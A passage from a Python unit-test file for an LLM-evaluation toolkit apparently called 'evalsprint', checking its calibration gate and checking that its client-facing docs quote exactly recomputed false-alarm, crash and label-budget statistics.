        real = calibrate(run, labels, **FAST)
        self.assertEqual(real["kappa_decision"], "usable")
        # ...what the docs say, checked against the code: a released judge passes, every other decision fails, with or without a threshold.
        self.assertEqual(gate_on(real)["verdict"], "pass")
        for decision in ("inconclusive", "not_trustworthy", "insufficient_data"):
            for threshold in (0.6, None):
                with self.subTest(decision=decision, min_judge_kappa=threshold):
                    self.assertEqual(gate_on({**real, "kappa_decision": decision}, min_judge_kappa=threshold)["verdict"], "regression")
        # the lower bound of the WEIGHTED interval, not the unweighted sample interval, is compared with min_judge_kappa
        lenient = {**real, "kappa_ci": [0.95, 1.0], "kappa_weighted_ci": [0.5, 0.9], "kappa_decision": "usable"}
        self.assertEqual(gate_on(lenient)["verdict"], "regression")
        strict = {**real, "kappa_ci": [0.1, 0.5], "kappa_weighted_ci": [0.7, 0.9], "kappa_decision": "usable"}
        self.assertEqual(gate_on(strict)["verdict"], "pass")
        # a file from before the weighted keys: unweighted pair, basis legacy, and a warning
        old = {k: v for k, v in real.items() if not k.startswith("kappa_weighted")}
        legacy = gate_on(old)
        self.assertEqual(legacy["calibration_status"]["basis"], "legacy")
        self.assertTrue(any("legacy calibration" in w for w in legacy["warnings"]))
        status = gate_on(real)["calibration_status"]
        self.assertEqual(status["basis"], "weighted")
        self.assertEqual(set(status), {"judge", "kappa", "kappa_ci", "kappa_decision", "basis", "ok"})
        self.assertEqual(status["kappa"], real["kappa_weighted"])
        # the report puts the weighted kappa first
        html = render_report(run, None, real).replace("&#x27;", "'")
        self.assertLess(html.index("Cohen's kappa (whole run, weighted)"), html.index("Cohen's kappa (labeled sample, unweighted)"))

        arch = (ROOT / "docs" / "ARCHITECTURE.md").read_text(encoding="utf-8")
        rule = re.search(r"(?m)^10\. Calibration.*$", arch).group(0)
        for topic in ("kappa_weighted_ci", "kappa_decision", "insufficient_data", "inconclusive", "not_trustworthy", "usable", "trustworthy", "basis", "legacy", "even when `min_judge_kappa` is `null`", "require_calibration: true"):
            with self.subTest(topic=topic):
                self.assertIn(topic, rule)
        for key in status:
            with self.subTest(status_key=key):
                self.assertRegex(arch, r'"calibration_status": \{[^\n]*"' + key + '"')
        for name, text in (
            ("docs/ARCHITECTURE.md", arch),
            ("docs/METHODOLOGY.md", (ROOT / "docs" / "METHODOLOGY.md").read_text(encoding="utf-8")),
        ):
            for stale in ("pending fix", "still read the unweighted", "still compares the unweighted", "One known gap"):
                with self.subTest(file=name, stale=stale):
                    self.assertNotIn(stale, text)
        readme_rule = re.search(r"(?m)^9\. with `require_calibration: true`.*$", (ROOT / "README.md").read_text(encoding="utf-8")).group(0)
        for topic in ("weighted", "inconclusive", "not_trustworthy", "insufficient_data", "legacy"):
            with self.subTest(readme=topic):
                self.assertIn(topic, readme_rule)
        template = (TEMPLATES / "eval.yaml").read_text(encoding="utf-8")
        self.assertIn("WEIGHTED kappa interval", template)
        self.assertIn("not_trustworthy", template.split("#   9. only with require_calibration", 1)[1].split("# max_pass_rate_drop: null", 1)[0])

    def test_set_examples_in_the_docs_name_keys_that_exist(self):
        """C3-15: `--set judges.0.value=600` was documented for the demo, whose judge 0 is the LLM judge (it has no `value`)."""
        from evalsprint.config import SuiteConfig

        demo = ROOT / "examples" / "support_bot" / "eval.yaml"
        for doc, config in ((ROOT / "README.md", demo), (TEMPLATES / "eval.yaml", TEMPLATES / "eval.yaml")):
            text = doc.read_text(encoding="utf-8")
            examples = re.findall(r"--set (judges\.(\d+)\.([\w]+))=", text)
            self.assertTrue(examples, doc.name)
            judges = SuiteConfig.load(config).judges
            for _path, index, key in examples:
                with self.subTest(doc=doc.name, example=_path):
                    self.assertLess(int(index), len(judges))
                    self.assertIn(key, judges[int(index)], f"{doc.name}: judge {index} of {config.name} has no key {key!r}")
        # The README example really runs against the demo.
        readme_command = re.search(r"evalsprint run -c eval\.yaml (--set [^\n]*judges\.\d+\.value=600)", (ROOT / "README.md").read_text(encoding="utf-8"))
        self.assertIsNotNone(readme_command)
        overrides = re.findall(r"--set (\S+)", readme_command.group(1))
        with tempfile.TemporaryDirectory() as tmp:
            args = ["run", "-c", str(demo), *[a for o in overrides for a in ("--set", o)], "--limit", "3", "--no-report", "--quiet", "--out", str(Path(tmp) / "r")]
            done = subprocess.run([sys.executable, "-m", "evalsprint", *args], cwd=tmp, env={**os.environ, "PYTHONPATH": str(ROOT), "PYTHONUTF8": "1"}, capture_output=True, text=True, encoding="utf-8")
            self.assertEqual(done.returncode, 0, done.stdout + done.stderr)
            summary = json.loads((Path(tmp) / "r" / "summary.json").read_text(encoding="utf-8"))
        self.assertIn({"type": "max_chars", "name": "length", "value": 600}, summary["judges_config"])

    def test_docs_and_templates_follow_the_gate_defaults_key_by_key(self):
        """A key added to DEFAULT_GATE must show up in the template, the architecture doc and the CI README."""
        from evalsprint.gate_defaults import DEFAULT_GATE

        for name, path in (
            ("templates/eval.yaml", TEMPLATES / "eval.yaml"),
            ("docs/ARCHITECTURE.md", ROOT / "docs" / "ARCHITECTURE.md"),
            ("templates/github/README.md", GITHUB / "README.md"),
        ):
            text = path.read_text(encoding="utf-8")
            for key in DEFAULT_GATE:
                with self.subTest(file=name, key=key):
                    self.assertRegex(text, rf"(?m)^\s*{key}:")

    def test_accepted_deviations_are_documented(self):
        arch = (ROOT / "docs" / "ARCHITECTURE.md").read_text(encoding="utf-8")
        section = arch.split("## Accepted deviations and cycle-2 follow-ups", 1)[1]
        for topic in (
            "opaque token", "BLIND_STRATA", "never merged", "critical_unverified", "excluded_errors", "exit 3", "Unknown top-level keys",
            "report --gate-config", 'gate_mode: "off"', "Private :: Do Not Upload", "case_sha", "judges_sha", "allow_judge_changes",
            "Wilson", "Jeffreys", "5 times", "0.92%", "94%",
            "target error on a case that passed", "tnr_reliable", "EVAL_PATHS", "REQUIRE_BASELINE", "Known residuals",
            "kappa_weighted_ci", "basis",
        ):
            with self.subTest(topic=topic):
                self.assertIn(topic, section)
        for topic in ("paired_error_rate", "candidate_paired_pessimistic", "target_error_regressions", "MIN_LABELS_RELEASE", "persist-credentials", "fetch-depth: 0", "baseline_missing"):
            with self.subTest(topic=topic):
                self.assertIn(topic, arch)
        # kit v0.2: every contract of cycle 3 (C9-C15) and the CI split have a place in the document, and so do their limits
        for contract in range(9, 16):
            with self.subTest(contract=f"C{contract}"):
                self.assertRegex(arch, rf"\bC{contract}\b")
        for topic in (
            "base_sha", "eval-candidate-", "eval-report-", "eval-gate-", "effective_min_net_loss", "effective_alpha", "gate_mode",
            "flaky_crashes", "repeat_protocol", "allow_repeat_change", "require_same_kit_version", "resumed_from", "--retry-errors",
            "evalsprint init", "evalsprint history", "export-fewshot", "max_output_chars", "max_section_chars", "oversize", ".label_secret",
            "HMAC", "tnr_reliable", "injection_suspected", "43%", "27.5%", "offline_judge", "JUDGE_PROVIDER=mock", "importlib.resources",
            "not re-measured", "GitHub-hosted runner",
        ):
            with self.subTest(topic=topic):
                self.assertIn(topic, arch)

    def test_the_simulator_is_called_seeded_not_deterministic(self):
        for path in (ROOT / "README.md", ROOT / "docs" / "METHODOLOGY.md"):
            text = path.read_text(encoding="utf-8")
            self.assertNotIn("deterministic simulator", text.replace("deterministic **simulator**", "deterministic simulator"), path.name)
            self.assertIn("seeded", text)

    def test_the_script_writes_json_only_when_asked(self):
        with tempfile.TemporaryDirectory() as tmp:
            target = Path(tmp) / "numbers.json"
            calls = []

            def fake_rate(n, noise, d):  # the exact computation is tested above; this is about the CLI
                calls.append((n, noise, d))
                return 0.05

            with unittest.mock.patch.object(self.gn, "rate", fake_rate), contextlib.redirect_stdout(io.StringIO()) as out:
                self.gn.main(["--json", str(target)])
            self.assertIn((45, 0.02, 0.0), calls)
            with unittest.mock.patch.object(self.gn, "rate", fake_rate), contextlib.redirect_stdout(io.StringIO()):
                self.gn.main([])  # no --json: nothing is written
            self.assertEqual([p.name for p in Path(tmp).iterdir()], ["numbers.json"])
            self.assertIn("FALSE ALARM", out.getvalue())
            data = json.loads(target.read_text(encoding="utf-8"))
            self.assertEqual([r["n"] for r in data["false_alarm"]], [45, 100, 149, 150, 200, 400, 800])
            self.assertFalse((ROOT / "scripts" / "gate_numbers.json").exists())


# ------------------------------------------------------------------------------ cycle 4: what the docs claim, recomputed


def read_doc(*parts: str) -> str:
    return (ROOT.joinpath(*parts)).read_text(encoding="utf-8")


CLIENT_DOCS = {
    "README.md": ("README.md",),
    "docs/METHODOLOGY.md": ("docs", "METHODOLOGY.md"),
    "docs/ARCHITECTURE.md": ("docs", "ARCHITECTURE.md"),
    "docs/SPRINT_PLAYBOOK.md": ("docs", "SPRINT_PLAYBOOK.md"),
    "templates/github/README.md": ("evalsprint", "templates", "github", "README.md"),
    "templates/eval.yaml": ("evalsprint", "templates", "eval.yaml"),
    "templates/cases.example.jsonl": ("evalsprint", "templates", "cases.example.jsonl"),
}


class DocsHonestyTests(unittest.TestCase):
    """Cycle 4 (v0.2.0): every number and every recommendation the client-facing docs make about the gate is recomputed here.

    The cycle-3 critics listed what a client must NOT be told (peak false alarm, "v0.2 is better everywhere", a false-alarm promise
    without the baseline lottery, "at most 5% from 150 cases" with crashes, a repeat of `n: 5` on every case, a perfect judge
    certified with 40 labels without the human pass rate, `tnr_reliable` as a guarantee). Each claim that replaced one of those is an
    exact computation (`scripts/gate_numbers.py`, cross-checked against `compare.expected_gate_rates`), and the tests below fail
    when a doc drops the claim, keeps the old one, or quotes a number the computation does not give.
    """

    @classmethod
    def setUpClass(cls):
        cls.gn = shared_gate_numbers()
        cls.docs = {name: read_doc(*parts) for name, parts in CLIENT_DOCS.items()}

    @staticmethod
    def pct(x: float, digits: int = 1) -> str:
        return f"{x * 100:.{digits}f}%"

    def assert_in_docs(self, figure: str, names) -> None:
        for name in names:
            with self.subTest(doc=name, figure=figure):
                self.assertIn(figure, self.docs[name])

    # ------------------------------------------------------------------ the shape of the curve

    def test_the_peaks_are_recomputed(self):
        """12.3% at n = 54 (5% noise) and 15.1% at the same size with 10% noise: the answer to "never above 11%"."""
        sizes = range(30, 150)
        for noise, expected in ((0.05, "12.3%"), (0.10, "15.1%")):
            with self.subTest(noise=noise):
                peak_n = max(sizes, key=lambda n: self.gn.rate(n, noise, 0.0))
                self.assertEqual((peak_n, self.pct(self.gn.rate(peak_n, noise, 0.0))), (54, expected))
        for name in ("README.md", "docs/METHODOLOGY.md", "docs/ARCHITECTURE.md", "docs/SPRINT_PLAYBOOK.md", "templates/github/README.md", "templates/eval.yaml"):
            self.assert_in_docs("15.1%", [name])
            self.assert_in_docs("12.3%", [name])

    def test_the_v01_comparison_is_recomputed_and_said(self):
        """Between 60 and 149 cases the rule of v0.1 had a lower false alarm AND a higher detection at 84 of 90 sizes."""
        better = self.gn.v01_better_sizes()
        self.assertEqual((len(better), len(range(60, 150))), (84, 90))
        self.assertEqual([n for n in range(60, 150) if n not in better], [60, 61, 62, 78, 79, 80])
        for name in ("README.md", "docs/METHODOLOGY.md", "docs/ARCHITECTURE.md", "docs/SPRINT_PLAYBOOK.md", "templates/github/README.md", "templates/eval.yaml"):
            with self.subTest(doc=name):
                text = " ".join(self.docs[name].replace("#", " ").split())
                self.assertRegex(text, r"84 of (the )?90 sizes|84 of those 90 sizes|84 of 90 sizes")
                self.assertRegex(text, r"60 (to|-) ?62 and 78 (to|-) ?80|60-62 and 78-80")
        for name in ("README.md", "docs/METHODOLOGY.md", "templates/github/README.md"):
            with self.subTest(doc=name, claim="not better at every size"):
                self.assertRegex(self.docs[name], r"(?i)not (a )?(strict improvement|better (one )?at every size|better everywhere)")

    def test_every_mention_of_the_v01_size_count_is_the_recomputed_one(self):
        """"84 of the 90 sizes" and "60 to 62 and 78 to 80" in EVERY mention, not just once per doc (whole numbers: `DocClaimsTests` skips them)."""
        better = self.gn.v01_better_sizes()
        worse = [n for n in range(60, 150) if n not in better]
        self.assertEqual((len(better), len(range(60, 150))), (84, 90))
        self.assertEqual(worse, [60, 61, 62, 78, 79, 80])
        seen = 0
        for name, text in self.docs.items():
            flat = " ".join(text.replace("**", "").replace("`", "").replace("#", " ").split())
            for match in re.finditer(r"(\d+) of (?:the |those )?(\d+) sizes", flat):
                seen += 1
                with self.subTest(doc=name, at=match.start()):
                    self.assertEqual(match.groups(), ("84", "90"))
                with self.subTest(doc=name, at=match.start(), what="says at which noise"):
                    # "84 of the 90 sizes at 5% noise": the count is true only there (at 10% noise it is 0 of 90)
                    self.assertRegex(flat[match.end() : match.end() + 70], r"at 5% noise")
                with self.subTest(doc=name, at=match.start(), what="says that at 10% noise v0.2 is the stricter rule"):
                    around = flat[max(0, match.start() - 600) : match.end() + 600]
                    self.assertRegex(around, r"10% noise.{0,80}stricter|stricter.{0,80}10% noise")
            for match in re.finditer(r"(\d+) (?:to|-) ?(\d+) and (\d+) (?:to|-) ?(\d+) cases", flat):
                seen += 1
                with self.subTest(doc=name, at=match.start(), what="sizes where v0.1 was not better"):
                    self.assertEqual(tuple(int(g) for g in match.groups()), (60, 62, 78, 80))
        self.assertGreaterEqual(seen, 8)

    def test_at_10_percent_noise_v02_is_the_stricter_rule_and_the_docs_say_so(self):
        """"84 of 90" holds at 5% noise only. At 10% noise v0.1 never had the lower false alarm (0 of 90 sizes); v0.2 blocks less often."""
        self.assertEqual(len(self.gn.v01_better_sizes(0.05)), 84)
        self.assertEqual(self.gn.v01_better_sizes(0.10), [])
        sizes = range(60, 150)
        lower_false_alarm = [n for n in sizes if self.gn.rate_rule(n, 0.10, 0.0, self.gn.flag01) < self.gn.rate(n, 0.10, 0.0)]
        self.assertEqual(lower_false_alarm, [], "v0.1 never had the lower false alarm at 10% noise")
        means = {key: self.pct(value) for key, value in self.gn.v01_means(0.10).items()}
        self.assertEqual(means, {"false_alarm_v02": "8.3%", "false_alarm_v01": "11.5%", "detection_v02": "61.2%", "detection_v01": "72.9%"})
        five = {key: self.pct(value) for key, value in self.gn.v01_means(0.05).items()}
        self.assertEqual(five, {"false_alarm_v02": "7.0%", "false_alarm_v01": "5.1%", "detection_v02": "79.7%", "detection_v01": "83.4%"})
        for name in ("README.md", "docs/METHODOLOGY.md", "docs/ARCHITECTURE.md", "templates/github/README.md"):
            with self.subTest(doc=name):
                flat = " ".join(self.docs[name].replace("**", "").replace("`", "").split())
                self.assertIn("8.3% against 11.5%", flat)
                self.assertIn("61.2% against 72.9%", flat)

    def test_the_baseline_lottery_is_recomputed(self):
        """The committed baseline is one noisy draw: P(false alarm > 15%) 28.8 / 14.0 / 7.2% at n = 45 / 100 / 200, exact, two ways."""
        from evalsprint.compare import expected_gate_rates

        expected = {45: ("28.8%", "7.0%", "42.9%"), 100: ("14.0%", "1.3%", "31.3%"), 200: ("7.2%", "0.6%", "22.6%")}
        for n, (over, median, p95) in expected.items():
            with self.subTest(n=n):
                lottery = self.gn.lottery(n, 0.05)
                self.assertEqual((self.pct(lottery["p_over_15"]), self.pct(lottery["median"]), self.pct(lottery["p95"])), (over, median, p95))
                from_code = expected_gate_rates(n, 0.05)["baseline_lottery"]  # a second implementation, inside the kit
                self.assertAlmostEqual(from_code["p_fa_over_15"], lottery["p_over_15"], places=6)
                self.assertAlmostEqual(from_code["median_fa"], lottery["median"], places=6)
                self.assertAlmostEqual(from_code["p95_fa"], lottery["p95"], places=6)
                self.assertAlmostEqual(from_code["false_alarm"] if "false_alarm" in from_code else expected_gate_rates(n, 0.05)["false_alarm"], self.gn.rate(n, 0.05, 0.0), places=6)
                # with a majority of three attempts in the baseline and in the pull requests the lottery all but disappears
                repeated = self.gn.lottery(n, self.gn.majority_flip(3, 0.05))
                self.assertLess(repeated["p_over_15"], 0.0015, n)
            for doc in ("README.md", "docs/METHODOLOGY.md", "docs/ARCHITECTURE.md", "docs/SPRINT_PLAYBOOK.md", "templates/github/README.md"):
                self.assert_in_docs(over, [doc])
        for doc in ("docs/METHODOLOGY.md", "templates/github/README.md", "docs/SPRINT_PLAYBOOK.md"):
            self.assertIn("under 0.15%", self.docs[doc], doc)
        for doc in ("README.md", "docs/METHODOLOGY.md", "templates/github/README.md"):
            self.assertRegex(self.docs[doc], r"(?i)baseline[^.]{0,80}(lottery|one noisy draw|noisy run)|(lottery|one noisy draw)[^.]{0,80}baseline", doc)

    def test_the_crash_numbers_are_recomputed(self):
        """"At most 5% from 150 cases on" assumes no target crashes: 1% crashes double it at 200 cases (4.0% -> 8.0%)."""
        one = {n: self.pct(self.gn.crash_false_alarm(n, 0.05, 0.01)) for n in (45, 100, 200)}
        five = {n: self.pct(self.gn.crash_false_alarm(n, 0.05, 0.05)) for n in (45, 100, 200)}
        none = {n: self.pct(self.gn.crash_false_alarm(n, 0.05, 0.0)) for n in (45, 100, 200)}
        self.assertEqual(none, {45: "10.6%", 100: "7.1%", 200: "4.0%"})
        self.assertEqual(one, {45: "14.7%", 100: "11.1%", 200: "8.0%"})
        self.assertEqual(five, {45: "34.6%", 100: "36.2%", 200: "42.4%"})
        for doc in ("README.md", "docs/METHODOLOGY.md", "docs/ARCHITECTURE.md", "docs/SPRINT_PLAYBOOK.md", "templates/github/README.md"):
            with self.subTest(doc=doc):
                self.assertIn("8.0%", self.docs[doc])
                self.assertRegex(self.docs[doc], r"(?i)crash")
        for doc in ("docs/METHODOLOGY.md", "templates/github/README.md", "docs/ARCHITECTURE.md"):
            for figure in ("14.7%", "11.1%", "34.6%", "36.2%", "42.4%"):
                self.assert_in_docs(figure, [doc])

    def test_no_doc_says_to_drop_repeat_from_150_cases_without_the_crash_caveat(self):
        for name, text in self.docs.items():
            for match in re.finditer(r"(?i)(delete|drop) (the|this) (`repeat:` )?block|delete the `repeat:` block", text):
                with self.subTest(doc=name, at=match.start()):
                    before = text[max(0, match.start() - 350) : match.start()]
                    self.assertRegex(before, r"(?i)crash", f"{name}: `{match.group(0)}` without saying the target must not crash")

    # ------------------------------------------------------------------ the repeat protocol (C17)

    WHOLE_GATE = {(3, 3): "5.79%", (5, 3): "1.11%", (5, 5): "0.92%", (5, 1): "9.37%", (1, 1): "36.67%"}  # (critical attempts, other attempts)
    STALE_WHOLE_GATE = ("5.92%", "1.13%", "9.47%", "39.41%")  # the independence approximation the docs quoted before cycle 4 loop-back 1

    def test_the_critical_tag_numbers_are_recomputed_for_per_tag(self):
        """Total false alarm of the WHOLE gate at n = 45 with 8 critical cases at 5% noise, exact: 5.79% (all x3), 1.11% (critical x5, rest x3), 0.92% (all x5)."""
        totals = {(a, b): self.pct(self.gn.whole_gate_false_alarm(45, 8, a, b), 2) for a, b in self.WHOLE_GATE}
        self.assertEqual(totals, self.WHOLE_GATE)
        self.assertEqual([self.pct(self.gn.critical_rule_false_alarm(8, a), 2) for a in (1, 3, 5)], ["32.25%", "5.61%", "0.92%"])
        for doc in ("README.md", "docs/METHODOLOGY.md", "docs/ARCHITECTURE.md", "templates/github/README.md", "templates/eval.yaml"):
            self.assert_in_docs("1.11%", [doc])
            self.assert_in_docs("5.79%", [doc])

    def test_the_whole_gate_figures_are_exact_and_the_old_approximation_is_gone(self):
        """The product of the two rules (independence) overstated the whole gate: 5.92 / 1.13 / 9.47 / 39.41%. The docs quote the exact joint figures."""
        from evalsprint.compare import expected_gate_rates_protocol

        approximation = {(a, b): self.pct(self.gn.total_false_alarm(45, 8, a, b), 2) for a, b in self.WHOLE_GATE}
        self.assertEqual(approximation, {(3, 3): "5.92%", (5, 3): "1.13%", (5, 5): "0.92%", (5, 1): "9.47%", (1, 1): "39.41%"})
        for (critical, other), shown in self.WHOLE_GATE.items():
            with self.subTest(critical_attempts=critical, other_attempts=other):
                exact = self.gn.whole_gate_false_alarm(45, 8, critical, other)
                self.assertLessEqual(exact, self.gn.total_false_alarm(45, 8, critical, other) + 1e-12, "the exact figure is never above the independence one")
                # a second implementation, inside the kit and built differently (conditioning on "no critical case flipped"), gives the same number
                from_code = expected_gate_rates_protocol([other] * 37 + [critical] * 8, [False] * 37 + [True] * 8, 0.05)["false_alarm"]
                self.assertAlmostEqual(from_code["whole_gate"], exact, places=9)
                self.assertEqual(self.pct(from_code["whole_gate"], 2), shown)
                self.assertAlmostEqual(from_code["critical_rule"], self.gn.critical_rule_false_alarm(8, critical), places=9)
        for name, text in self.docs.items():
            for stale in self.STALE_WHOLE_GATE:
                with self.subTest(doc=name, stale=stale):
                    self.assertNotIn(stale, text)
        for name in ("README.md", "docs/METHODOLOGY.md", "docs/ARCHITECTURE.md", "templates/github/README.md"):
            with self.subTest(doc=name, what="the whole-gate figures are described as exact"):
                self.assertRegex(" ".join(self.docs[name].replace("**", "").split()), r"(?i)(exact|joint distribution)")
        for name in ("README.md", "docs/METHODOLOGY.md", "docs/ARCHITECTURE.md", "templates/github/README.md"):
            with self.subTest(doc=name, what="the figure with no repeats at all"):
                self.assertIn("36.67%", self.docs[name])
        for name in ("docs/METHODOLOGY.md", "docs/ARCHITECTURE.md", "templates/github/README.md"):
            with self.subTest(doc=name, what="the figure with the critical cases at 5 and the rest at 1"):
                self.assertIn("9.37%", self.docs[name])

    def test_every_doc_recommends_per_tag_for_the_critical_cases(self):
        for name in ("README.md", "docs/METHODOLOGY.md", "docs/ARCHITECTURE.md", "docs/SPRINT_PLAYBOOK.md", "templates/github/README.md", "templates/eval.yaml", "templates/cases.example.jsonl"):
            with self.subTest(doc=name):
                self.assertIn("per_tag", self.docs[name])
                self.assertRegex(self.docs[name], r"per_tag: \{[^}]*: ?5\}")

    def test_the_old_repeat_spelling_is_only_mentioned_as_the_legacy_one(self):
        """`{n: 5, tags: [safety]}` still works, and means `{n: 1, per_tag: {safety: 5}}`: no doc may RECOMMEND it any more."""
        for name, text in self.docs.items():
            for match in re.finditer(r"repeat: ?\{n: ?5, ?tags:", text):
                with self.subTest(doc=name, at=match.start()):
                    around = text[max(0, match.start() - 300) : match.end() + 300]
                    self.assertRegex(around, r"(?i)older|legacy|still works|spelling|cycle-2|C17", f"{name}: the old spelling is recommended")
            with self.subTest(doc=name, phrase="n: 5 on every case"):
                self.assertNotRegex(text, r"(?i)use `n: 5` for every case|`n: 5` for every case, or")
        self.assertIn("{n: 1, per_tag: {safety: 5}}", self.docs["README.md"])
        self.assertNotIn("n: 3, tags", self.docs["README.md"])

    def test_the_template_keeps_the_scaffold_default_and_the_critical_line_as_a_comment(self):
        text = self.docs["templates/eval.yaml"]
        self.assertRegex(text, r"(?m)^repeat:\n  n: 3\n  # per_tag: \{safety: 5\}")
        self.assertRegex(text, r"(?m)^# target_retries: 1$")
        self.assertIn("data_files", text)
        self.assertNotIn("tag_drop_min_cases: 10", text)

    # ------------------------------------------------------------------ labels and the calibration wording (C20)

    def test_the_labels_budget_table_of_the_playbook_is_the_one_the_code_returns(self):
        """The playbook prints `calibration.labels_budget_markdown()`: a change of a number there fails here, and so does a stale doc."""
        from evalsprint import calibration

        table = calibration.labels_budget_table()
        rows = {round(r["human_pass_rate"] * 100): r["census"] for r in table["rows"]}
        self.assertEqual({rate: (c["usable"], c["trustworthy"]) for rate, c in rows.items() if rate in (50, 70, 80, 90)}, {50: (40, 40), 70: (40, 48), 80: (40, 67), 90: (66, 124)})
        self.assertGreaterEqual(rows[90]["trustworthy"], 120, "the critic measured about 125 labels for a perfect judge at 90% human pass: the human fails are random")
        playbook = self.docs["docs/SPRINT_PLAYBOOK.md"]
        printed = [line for line in calibration.labels_budget_markdown().splitlines() if line.startswith("|")]
        self.assertGreaterEqual(len(printed), 8)
        for line in printed:
            with self.subTest(line=line):
                self.assertIn(line, playbook)
        # the one-sentence version in the other docs: first trustworthy at 40, 48, 67 and 124 labels at 50/70/80/90% human pass rate (at least
        # 80% of the runs); the 41, 53 and 96 of the exact-share scan (`test_perfect_agreement_label_counts_are_recomputed`) stay, said as such
        for doc in ("README.md", "docs/METHODOLOGY.md", "docs/ARCHITECTURE.md", "templates/github/README.md"):
            with self.subTest(doc=doc):
                self.assertRegex(" ".join(self.docs[doc].split()), r"40,? (and )?48,? (and )?67,? and 124|40 / 48 / 67 / 124")
        for doc in ("README.md", "docs/METHODOLOGY.md", "docs/ARCHITECTURE.md", "docs/SPRINT_PLAYBOOK.md", "templates/github/README.md"):
            with self.subTest(doc=doc, what="the number of human fails is random"):
                self.assertRegex(" ".join(self.docs[doc].split()), r"(?i)(number of )?human fails[^.]{0,60}(random|left to chance)|(random|chance)[^.]{0,60}human fails")
            with self.subTest(doc=doc, what="the old budget sources and figures are gone"):
                self.assertNotIn("cycle4/eval-scientist-judge/", self.docs[doc])
                self.assertNotRegex(self.docs[doc], r"40 to 125 labels|40 / 41 / 53 / 96|91 / 205")
        self.assertIn("labels_budget_table", self.docs["docs/SPRINT_PLAYBOOK.md"])

    def test_tnr_reliable_is_described_as_a_screening_flag_everywhere(self):
        from evalsprint.calibration import TNR_SCREEN_MEANING

        self.assertIn("screening flag, not a guarantee", TNR_SCREEN_MEANING)
        for name in ("README.md", "docs/METHODOLOGY.md", "docs/ARCHITECTURE.md", "docs/SPRINT_PLAYBOOK.md", "templates/github/README.md"):
            with self.subTest(doc=name):
                self.assertRegex(self.docs[name], r"(?i)screening flag|screen, not a guarantee|screen that tells you")
                self.assertRegex(self.docs[name], r"2% (to|-) 28%")
                self.assertNotRegex(self.docs[name], r"(?i)guarantees? (a )?(true[- ]negative rate|TNR)")

    def test_labels_are_budgeted_by_the_human_pass_rate_and_the_census_is_a_floor(self):
        for name in ("README.md", "docs/SPRINT_PLAYBOOK.md", "templates/github/README.md", "docs/METHODOLOGY.md"):
            with self.subTest(doc=name):
                self.assertRegex(self.docs[name], r"(?i)(how often|share of outputs|human pass rate|pass(es)? 90%)")
                self.assertRegex(self.docs[name], r"(?i)floor|best[- ]case|more (for|when)")

    # ------------------------------------------------------------------ cycle 4, loop-back 1 (C25a): what the critics asked to be said

    def test_the_critics_two_measured_sentences_follow_the_client_paragraph_and_are_recomputed(self):
        """README, METHODOLOGY and the workflow README add, after the client paragraph, the critic's sentences on critical cases and on crashes."""
        gn = self.gn
        whole = {key: self.pct(gn.whole_gate_false_alarm(45, 8, *key), 2) for key in ((1, 1), (3, 3), (5, 3), (5, 5))}
        self.assertEqual(whole, {(1, 1): "36.67%", (3, 3): "5.79%", (5, 3): "1.11%", (5, 5): "0.92%"})
        five = gn.crash_blocked_or_unhealthy(100, 0.05, 0.05)  # a target that crashes on 5% of the calls, 100 cases, an unchanged system
        retried = gn.crash_blocked_or_unhealthy(100, 0.05, 0.05**2)  # `target_retries: 1`: a case ends in an error only if two calls in a row crash
        self.assertEqual((round(five["unhealthy"] * 100), round(five["blocked"] * 100), round(retried["blocked"] * 100)), (38, 54, 8))
        # C22: what the default retry hides (exact, 100 cases, calls that crash independently): a target that crashes on 10% / 20% of its calls
        ten, twenty = (gn.crash_blocked_or_unhealthy(100, 0.05, crash**2) for crash in (0.10, 0.20))
        self.assertEqual((round(ten["blocked"] * 100), round(twenty["blocked"] * 100), round(gn.rate(100, 0.05, 0.0) * 100)), (11, 39, 7))
        self.assertEqual((round(gn.retry_share_warning_rate(100, 0.05, 0.10) * 100), round(gn.retry_share_warning_rate(100, 0.05, 0.20) * 100)), (11, 89))
        # the sums behind them: the unhealthy share is the binomial tail (more than 5 crashed cases of 100), the other two are checked against
        # `crash_false_alarm`, which prices the gate alone and ignores the health of the run
        tail = sum(math.comb(100, k) * 0.05**k * 0.95 ** (100 - k) for k in range(6, 101))
        self.assertAlmostEqual(five["unhealthy"], tail, places=9)
        self.assertLessEqual(five["trips"], gn.crash_false_alarm(100, 0.05, 0.05) + 1e-9)
        self.assertLessEqual(gn.crash_false_alarm(100, 0.05, 0.05), five["blocked"] + 1e-9)
        self.assertAlmostEqual(retried["blocked"], gn.crash_false_alarm(100, 0.05, 0.05**2), places=5)
        sentences = (
            "an unchanged change is blocked 36.67% of the time with one attempt per case, 5.79% with every case repeated 3 times, and 1.11% with every case 3 times and the critical ones 5 times",
            "repeating every case 5 times alone gives 0.92% and costs more",
            "A target that crashes on 5% of the calls makes an unchanged 100-case change blocked in 54% of the runs (38% of all runs are unhealthy and never compared)",
            "one retry inside the run (`target_retries: 1`, the default) brings it to 8%",
            "The same retry also hides a candidate that starts to crash on some calls: with `target_retries: 1` and 100 cases, one whose target crashes on 10% of its calls is blocked in 11% of the runs and one that crashes on 20% of its calls in 39%, against 7% for an unchanged candidate",
            "The gate now blocks a change of `target_retries`, prints the retries of both runs and warns when the candidate retried at least 10 percentage points more of its calls than the baseline, but that warning is weak for small increases",
            "it fires in 11 of 100 comparisons for a candidate that crashes on 10% of its calls and in 89 of 100 for 20%",
            "so the crash and retry counts of the report must still be read next to the gate",
        )
        for name in ("README.md", "docs/METHODOLOGY.md", "templates/github/README.md"):
            with self.subTest(doc=name):
                text = self.flat(self.docs[name])
                start = text.index(self.CRITIC_GATE_PARAGRAPH)
                for sentence in sentences:
                    self.assertIn(self.flat(sentence), text)
                    self.assertGreater(text.index(self.flat(sentence)), start, "after the client paragraph, never inside or before it")
                self.assertEqual(text.count(self.CRITIC_GATE_PARAGRAPH), 1)
                # the sentence about what the gate does not see is NOT written: the gate now compares `target_retries` (C22), it is documented as shipped
                self.assertNotRegex(text, r"(?i)gate does not compare .?target_retries")
                self.assertNotIn("The same retry also hides a candidate that starts to crash on some calls, so the crash", text)  # the sentence C22 made wrong
        cycle4 = ROOT / "orchestration" / "2026-09-29_kit-v0.2" / "cycle4" / "critic-methodology" / "client_paragraph.md"
        if cycle4.exists():  # the source of the sentences: the critic's file, which also carries the paragraph word for word
            quoted = " ".join(line.lstrip("> ").strip() for line in cycle4.read_text(encoding="utf-8").splitlines() if line.startswith(">"))
            self.assertIn(self.CRITIC_GATE_PARAGRAPH, quoted)
            self.assertIn("8 critical cases in a 45-case suite and 5% noise per attempt", cycle4.read_text(encoding="utf-8"))

